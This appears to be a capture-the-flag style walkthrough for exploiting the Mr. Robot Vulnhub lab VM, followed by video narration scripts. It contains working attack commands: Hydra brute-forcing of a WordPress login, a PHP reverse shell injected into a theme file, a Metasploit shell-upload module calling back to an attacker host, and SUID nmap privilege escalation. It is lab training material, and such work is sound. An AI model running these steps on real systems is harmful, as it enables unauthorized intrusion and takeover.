# Overview of the Exploit Process

## Step 1: Set Up Environment
- **Objective:** Prepare your Kali Linux attacker VM and the Mr. Robot Vulnhub target VM.
- **Actions:**
  - Install necessary software on Kali Linux:
    ```bash
    sudo apt update
    sudo apt install -y nmap gobuster hydra metasploit-framework
    ```

## Step 2: Network Scanning
- **Objective:** Identify the target's open ports and services.
- **Tools:** Nmap
- **Commands:**
    ```bash
    nmap -sS -sV -O 192.168.1.226
    ```

## Step 3: Enumeration
- **Objective:** Gather detailed information about the target's web applications and technologies.
- **Tools:** Gobuster, Wappalyzer
- **Commands:**
    ```bash
    gobuster dir -u http://192.168.1.226 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    ```
  - Use Wappalyzer browser extension to identify web technologies used by the target site.

## Step 4: Vulnerabilities
- **Objective:** Identify vulnerabilities in the target's web applications and services.
- **Tools:** Nmap, Nikto
- **Commands:**
    ```bash
    nmap --script vuln 192.168.1.226
    nikto -h http://192.168.1.226
    ```

## Step 5: Brute-force
- **Objective:** Gain access to the target by brute-forcing login credentials.
- **Tools:** Hydra
- **Commands:**
    ```bash
    hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.226 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
    ```

## Step 6: Reverse Shell
- **Objective:** Gain remote access to the target system.
- **Tools:** PHP Reverse Shell, Metasploit

### Manual PHP Reverse Shell
1. **Upload a PHP Reverse Shell:**
   - Go to the WordPress admin panel at `http://192.168.1.226/wp-admin` and log in using the credentials found or brute-forced.
   - Navigate to Appearance > Theme Editor, select the `404.php` file, and insert the PHP reverse shell code from [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

2. **Start a Netcat Listener:**
    ```bash
    nc -lvnp 4444
    ```

3. **Trigger the Reverse Shell:**
   - Visit the modified `404.php` file in your browser to trigger the reverse shell.
    ```bash
    http://192.168.1.226/wp-content/themes/[your-theme]/404.php
    ```

### Using Metasploit
1. **Start Metasploit:**
    ```bash
    msfconsole
    ```

2. **Select the Exploit Module:**
    ```bash
    use exploit/unix/webapp/wp_admin_shell_upload
    ```

3. **Set Required Options:**
    ```bash
    set RHOSTS 192.168.1.226
    set RPORT 80
    set USERNAME Elliot
    set PASSWORD ER28-0652
    set TARGETURI /wp-admin
    set LHOST 192.168.1.223
    set LPORT 4444
    set payload php/meterpreter/reverse_tcp
    set VERBOSE true
    ```

4. **Run the Exploit:**
    ```bash
    exploit
    ```

5. **Interacting with Meterpreter:**
    ```plaintext
    meterpreter > shell
    python -c 'import pty; pty.spawn("/bin/bash")'
    ```

6. **Navigating the File System:**
    ```bash
    cd /home/robot
    ls -a
    cat key-1-of-3.txt
    cat key-2-of-3.txt
    ```

### Privilege Escalation (if needed)
- **Identify SUID binaries:**
    ```bash
    find / -perm -u=s -type f 2>/dev/null
    ```

- **Exploit Nmap for Privilege Escalation:**
    ```bash
    /usr/local/bin/nmap --interactive
    !sh
    ```

- **Read the Final Key:**
    ```bash
    find / -name "key-3-of-3.txt" 2>/dev/null
    cat /root/key-3-of-3.txt
    ```

### Clean Up
1. **Remove Uploaded Files:**
    ```bash
    rm /wp-content/plugins/lCXSKnpNHP/DXgKrelAug.php
    rm -rf /wp-content/plugins/lCXSKnpNHP
    ```



Step 1: Set Up Environment
Step 2: Network Scanning : 
    - nmap
Step 3: Enumeration
    - Gobuster
    - Wappalyzer
Step 4: Vulnerabilities
    - nmap
    - nikto
Step 5: Brute-force
    - Python Scripts
    - Hydra
Step 6: Reverse Shell
    - PHP Reverse Shell
    - Metasploit
Report
Videos



```python
<speak>
    Hi, I'm Ivan, and today I'll show you how to exploit the Mr. Robot Vulnhub VM using Kali Linux.<break time="500ms"/>

    First, I set up the Kali Linux attacker VM and the Mr. Robot target VM, which hosts a WordPress site with three hidden keys.<break time="500ms"/> I used Nmap to scan the target IP for open ports and services.<break time="500ms"/>

    Next, I used Gobuster to find hidden directories and Wappalyzer to identify web technologies in use.<break time="500ms"/>

    Then, I looked for vulnerabilities using Nmap scripts and Nikto.<break time="500ms"/> After identifying potential weak points, I used Hydra to intelligently brute-force the WordPress admin login.<break time="500ms"/>

    Once I obtained the login credentials, I exploited the WordPress admin interface using Metasploit.<break time="500ms"/> By configuring the admin shell upload module and running the exploit, I gained a Meterpreter session, which allowed me to navigate the file system.<break time="500ms"/>

    Finally, I located and read the three hidden keys on the target system.<break time="500ms"/>

    And that's how you can exploit the Mr. Robot VM using Kali Linux to find all the hidden keys.<break time="500ms"/> Thanks for watching!
</speak>
```

- **Introduction:**
"Welcome to our comprehensive guide on penetration testing. Learn how to ethically hack and secure your systems in just six easy steps."

- **Step 1: Set Up Environment:**
"First, set up a controlled and isolated environment. This ensures your testing doesn't impact live systems and provides a safe space for your work."

- **Step 2: Network Scanning:**
"Next, perform network scanning using Nmap. Nmap helps identify live hosts, open ports, and available services, providing a map of your target network."

- **Step 3: Enumeration:**
"Now, move on to enumeration. Use Gobuster to brute-force directories and Wappalyzer to identify technologies used by the target website. This reveals valuable information about the target."

- **Step 4: Identifying Vulnerabilities:**
"Identify vulnerabilities with Nmap and Nikto. Nmap scripts can detect specific vulnerabilities, while Nikto scans for outdated software and potential security issues in web servers."

- **Step 5: Brute-force Attacks:**
"For brute-force attacks, utilize Python scripts and Hydra. These tools attempt to guess login credentials, exposing weak passwords and access points."

- **Step 6: Reverse Shell:**
"Finally, achieve a reverse shell using a PHP reverse shell script or Metasploit. This step provides control over the target system, allowing you to demonstrate the impact of vulnerabilities."

- **Conclusion:**
"Remember, penetration testing is a powerful tool for improving security. Always practice ethical hacking and responsible disclosure. Stay secure!"